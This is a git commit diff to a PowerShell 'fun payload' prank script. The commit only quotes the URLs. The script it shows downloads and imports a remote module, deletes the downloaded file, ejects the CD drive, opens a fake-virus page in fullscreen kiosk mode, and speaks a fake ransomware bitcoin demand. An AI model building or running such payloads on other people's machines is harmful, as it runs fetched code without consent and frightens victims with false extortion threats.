e727565338889237ad2b53570a59856c2090557a
jkljkl1197 <jordan1197@hotmail.ca>
2021-05-27 22:24:13 -0400

    Update FunPayload.ps1

--- FunPayload.ps1
+++ FunPayload.ps1
@@ -2,16 +2,16 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/perplexityjeff/PowerSh
 Import-Module .\PSTrollFunctions.psm1;
 rm PSTrollFunctions.psm1;
 Open-CDDrive
-Start-Process msedge.exe --kiosk https://geekprank.com/fake-virus/ --edge-kiosk-type=fullscreen
+Start-Process msedge.exe --kiosk "https://geekprank.com/fake-virus/" --edge-kiosk-type=fullscreen
 Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;
 $speak.Speak("You Have Been Hack, a crypto locker will execute, send bitcoin to my address now");
 Start-Sleep -s 6;
 Get-Process msedge | Stop-Process
 Start-Sleep -s 2;
-Start-Process msedge.exe --kiosk https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1 --edge-kiosk-type=fullscreen
+Start-Process msedge.exe --kiosk "https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1" --edge-kiosk-type=fullscreen
 get-process msedge | stop-process
 Start-Sleep -s 10;
-Start-Process msedge.exe --kiosk https://www.youtube.com/watch?v=BYIzxLIW71E?autoplay=1 --edge-kiosk-type=fullscreen
+Start-Process msedge.exe --kiosk "https://www.youtube.com/watch?v=BYIzxLIW71E?autoplay=1" --edge-kiosk-type=fullscreen
 get-process msedge | stop-process
 Start-Sleep -s 72;
 $speak.Speak("have you see the quenouille!");
